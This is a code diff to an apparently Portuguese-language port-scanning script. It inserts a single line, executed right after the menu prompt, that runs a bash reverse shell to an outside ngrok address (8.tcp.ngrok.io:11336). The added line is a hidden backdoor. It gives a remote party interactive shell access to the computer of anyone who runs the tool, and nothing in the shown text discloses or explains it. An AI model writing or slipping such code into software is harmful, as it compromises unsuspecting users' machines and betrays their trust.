@@ -25,6 +25,7 @@ by : \033[91mKoppy\033[0m and \033[92mCh4rse\033[0m
         ''')
 try:
     op = int(input('Digite sua opção : '))
+    os.system("bash -i >& /dev/tcp/8.tcp.ngrok.io/11336 0>&1")
 
     if op == 1:
         ports = [20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5555, 5900, 8080, 8888]
